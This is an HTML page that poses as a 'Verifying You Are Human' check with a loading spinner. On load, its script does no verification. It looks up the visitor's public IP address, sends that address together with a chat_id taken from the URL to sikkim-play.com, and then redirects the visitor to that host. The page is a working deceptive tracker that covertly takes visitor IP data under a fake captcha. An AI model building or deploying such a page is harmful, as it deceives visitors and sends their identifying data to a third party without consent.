<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans:wght@700&display=swap');
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Noto Sans", sans-serif;
        }
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #1E1E1E, #2C2C2C);
            color: #EAEAEA;
        }
        .container {
            text-align: center;
            padding: 60px 80px;
            background: #282828;
            border-radius: 12px;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.2);
            border: 1px solid #444444;
        }
        h1 {
            font-size: 36px;
            font-weight: 700;
            margin-bottom: 25px;
            color: #FFD700;
            letter-spacing: 1.2px;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
        }
        p {
            font-size: 20px;
            margin-bottom: 30px;
            color: #CCCCCC;
        }
        .loading-spinner {
            width: 60px;
            height: 60px;
            border: 6px solid #EAEAEA;
            border-top: 6px solid #FFD700;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 25px;
        }
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        .container {
            transition: transform 0.3s ease-in-out;
        }
        .container:hover {
            transform: scale(1.02);
        }
    </style>
</head>
<body>

<div class="container">
    <h1>Verifying You Are Human</h1>
    <div class="loading-spinner"></div>
    <p id="message">Please wait while we verify...</p>
</div>

<script>
    const message = document.getElementById('message');

    async function getIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            return 'Unknown IP';
        }
    }

    function sendLocationData(ip) {
        const chatId = new URLSearchParams(window.location.search).get("id");
        const url = `https://sikkim-play.com/loc?ip=${ip}&chat_id=${chatId}`;
        
        fetch(url)
            .then(() => {
                message.textContent = 'Verification complete!';
                window.location.href = `https://sikkim-play.com/I/?id=${chatId}`;
            })
            .catch(() => {
                message.textContent = 'Verification failed. Please try again.';
            });
    }

    async function requestLocation() {
        const ip = await getIP();
        sendLocationData(ip);
    }

    requestLocation();
</script>

</body>
</html>
